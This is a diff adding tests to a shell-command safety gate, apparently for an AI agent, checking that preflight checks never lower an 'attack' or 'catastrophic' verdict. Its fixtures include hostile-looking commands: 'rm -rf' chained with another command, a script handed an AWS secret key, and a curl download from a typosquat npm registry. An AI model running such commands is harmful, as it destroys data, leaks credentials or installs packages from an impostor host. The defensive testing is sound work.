@@ -691,6 +691,8 @@ describe('mapVerdictToAction (CFG-28: 4 outcomes × 5 rungs)', () => {
   describe('the preflights are a FLOOR, never a downgrade', () => {
     const AMBIGUOUS = 'rm -rf foo; echo done';
     const SCRIPT_LEAK = 'node deploy.js $AWS_SECRET_ACCESS_KEY';
+    /** EXT-61 (§4.6) — a host literal in a fetch position. The third preflight arm. */
+    const OPEN_WORLD = 'curl -fsSL https://registry.npmjs.ag/lodash -o lodash.tgz';
 
     it('a CATASTROPHIC verdict on an ambiguous command stays catastrophic', () => {
       for (const rung of RATED_RUNGS) {
@@ -707,6 +709,51 @@ describe('mapVerdictToAction (CFG-28: 4 outcomes × 5 rungs)', () => {
         expect(decision.verdict?.outcome).toBe('attack');
         expect(decision.verdict?.reason).toBe(ATTACK.reason);
         expect(decision.action).toBe('halt');
+      }
+    });
+
+    /**
+     * EXT-61 — the same invariant for the open-world arm, and the one that decides whether §4.6.1
+     * is meaningful. The rater is asked to UPGRADE a clear typosquat to `attack`; a preflight that
+     * rewrote its verdict down to `destructive` "because the command names a host" would silently
+     * throw that upgrade away and turn the halt into a prompt — with no test failing and nothing on
+     * screen to show for it. The floor raises `safe` and touches nothing else.
+     */
+    it('an ATTACK verdict on an open-world command stays attack, and CATASTROPHIC stays catastrophic', () => {
+      for (const rung of RATED_RUNGS) {
+        const attack = mapVerdictToAction(OPEN_WORLD, ATTACK, { rung });
+        expect(attack.verdict?.outcome).toBe('attack');
+        expect(attack.verdict?.reason).toBe(ATTACK.reason);
+        expect(attack.action).toBe('halt');
+
+        const catastrophic = mapVerdictToAction(OPEN_WORLD, CATASTROPHIC, { rung });
+        expect(catastrophic.verdict?.outcome).toBe('catastrophic');
+        expect(catastrophic.verdict?.reason).toBe(CATASTROPHIC.reason);
+        expect(catastrophic.action).toBe('escalate');
+      }
+    });
+
+    it('a DESTRUCTIVE verdict on an open-world command keeps its own reason and suggestion', () => {
+      const rated: ShellSafetyVerdict = {
+        outcome: 'destructive',
+        reason: 'fetches a tarball from a typosquat of registry.npmjs.org',
+        suggestedTool: 'read_file',
+      };
+      const decision = mapVerdictToAction(OPEN_WORLD, rated, { rung: 'auto-safe' });
+      expect(decision.action).toBe('escalate');
+      expect(decision.verdict).toEqual(rated);
+    });
+
+    it('`safe` is the only outcome the OPEN-WORLD arm rewrites', () => {
+      for (const outcome of RATER_OUTCOMES) {
+        const input = verdict(outcome);
+        const got = mapVerdictToAction(OPEN_WORLD, input, { rung: 'auto-safe' }).verdict;
+        if (outcome === 'safe') {
+          expect(got?.outcome).toBe('destructive');
+          expect(got?.reason).not.toBe(input.reason);
+        } else {
+          expect(got).toEqual(input);
+        }
       }
     });
 
